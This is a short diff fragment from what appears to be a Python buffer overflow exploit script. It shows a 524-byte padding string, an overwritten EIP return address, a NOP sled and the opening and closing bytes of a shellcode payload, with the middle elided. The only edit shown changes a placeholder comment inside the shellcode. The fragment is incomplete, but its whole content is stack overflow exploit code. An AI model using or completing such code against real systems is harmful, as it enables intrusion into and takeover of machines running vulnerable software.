@@ -129,7 +129,7 @@ padding = b'A' * 524
 EIP = b"\xf3\x12\x17\x31"
 nop = b"\x90"  * 16
 shellcode = (b"\xda\xd3\xb8\xa1\x9f\xcf\xe3\xd9\x74\x24\xf4\x5b\x2b\xc9"
-...boring bits
+...
 b"\xb5")
 
 try: 
